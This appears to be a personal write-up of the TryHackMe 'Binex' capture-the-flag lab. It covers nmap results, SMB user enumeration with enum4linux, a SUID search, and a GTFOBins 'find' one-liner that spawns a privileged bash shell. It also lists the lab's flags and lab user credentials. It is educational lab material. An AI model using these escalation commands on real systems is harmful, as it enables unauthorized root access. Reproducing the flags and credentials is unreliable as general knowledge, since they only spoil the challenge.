see: [write-up](https://www.notion.so/BINEX-WRITE-UP-346d388fc1a34ceb83bfbb20318fb58b)

see: [writeup-alternative_interesting](https://github.com/Syp1ng/Writeups/blob/master/THM/Binex.pdf)
This method makes the use of python script


Task1: Gain Initial access
--------------------------

nmap

```
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f:36:de:da:2f:c3:b7:78:6f:a9:25:d6:41:dd:54:69 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3OBXYJUrPGglNoKPhUcwp3YiZRy6qNTHdOmGsgzy5ll+GDY8zkoIsNiqdHSaDKXvO+9ix+dZNF9CtgRDrLhL6j2Bn4RI011xveUiTF6LO7PEsv5RYI7KueOXyaw8vahdf/CdV4RQXhefge6FIZqkvhDGQsid8F3e846kJ7FPZYAcwQ5Iapv9ae1+23OZcDLtdTDlQOZIyNaVmPu0XVjHYnvHsC5r/eX/wq9WzETDVzgANMwsWOeZmjH956z4hjL7K91KHeaMnRHeO/tln1Pk9EG1eGn4FHsD1/LdumWp0pHDUXwTJ7OwuuucnzuiLrx8jDr03bEu4kPKpkB0Bc1Kb
|   256 d0:78:23:ee:f3:71:58:ae:e9:57:14:17:bb:e3:6a:ae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJlazDOaT1mvebWCf/KbUSzgt3MCueCjEYz6Uf6tDyYG5H7HsVTbKbphLPJupB3gght1wmk+8BpQe8q4fa+1ZXQ=
|   256 4c:de:f1:49:df:21:4f:32:ca:e6:8e:bc:6a:96:53:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIdOXbBN4ecgx8K412W8m2fd7R6y7c0O9uXXFv+gLusY
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)

Service Info: Host: THM_EXPLOIT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Host: `thm_exploit`

port: 139 and 445 => smb enumeration for linux...

In hint: Hint 1: RID range 1000-1003
```
enum4linux -R 1000-1003 $IP

---snip ---
S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)
---snip---

```
and another hint: The longest username has the unsecure password.

Obviously, username will be tryhackme for this challenge and also it the longest...

Now cracking with hydra...
```


```

Got the passwd and now login to victim via ssh


Task2: SUID::Binary 1
----------------------

Now to get the flag we have to access des home directory, for that we have to find suid binary to priv-esc

```
$ find / -type f -perm -u=s -user des -exec ls -ldb {} \; 2>/dev/null

-rwsr-sr-x 1 des des 238080 Nov  5  2017 /usr/bin/find
```

Using GTFO bin: 
```
find . -exec /bin/bash -p \; -quit
```

we got the flag as well as some info:
```
You flag is THM{exploit_the_SUID}

login crdential (In case you need it)
username: des
password: destructive_72656275696c64
```

1. What is the contents of /home/des/flag.txt?

--> THM{exploit_the_SUID}


Task3: Buffer Overflow::Binary 2
--------------------------------

1. What is the contents of /home/kel/flag.txt?

--> `THM{buffer_overflow_in_64_bit}`


Other infos:
```
The user credential
username: kel
password: kelvin_74656d7065726174757265
```

Task4: PATH Manipulation::Binary3
----------------------------------

Get the root flag from the root directory. This will require you to understand how the PATH variable works.

1. What is the contents of /root/root.txt?

--> `THM{SUID_binary_and_PATH_exploit}`

see: [https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/] (https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)

